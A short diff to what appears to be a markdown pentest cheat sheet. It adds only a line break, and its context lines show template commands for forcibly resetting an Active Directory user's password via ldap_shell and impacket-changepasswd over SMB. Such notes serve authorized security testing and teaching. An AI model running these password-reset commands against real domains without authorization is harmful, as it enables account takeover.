@@ -16,6 +16,8 @@ Ldap_shell -> `ldap_shell <domain>/<user>:<password> -dc-ip <ip>`
 
 `set password <target_user> <new_password>`
 
+<br>
+
 Using SMB protocol:
 
 `impacket-changepasswd <domain>/<target_user>@<ip> -newpass <new_password> -altuser <controlled_user>/raj -altpass <controlled_user_password> -reset`
